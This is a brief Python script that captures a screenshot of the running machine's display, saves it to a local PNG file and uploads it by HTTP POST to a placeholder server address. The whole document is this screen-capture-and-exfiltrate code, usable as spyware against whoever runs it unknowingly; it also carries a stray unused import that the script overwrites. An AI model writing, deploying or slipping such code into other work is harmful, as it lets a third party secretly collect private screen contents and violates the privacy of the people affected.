#!/usr/bin/python3

from importlib.metadata import files
import pyautogui, requests

im = pyautogui.screenshot()
im.save('screenshot.png', 'png')

url = 'http://{SERVER}/{PATH}'
files = {'screenshot': open('screenshot.png', 'rb')}
requests.request('POST', url, files=files)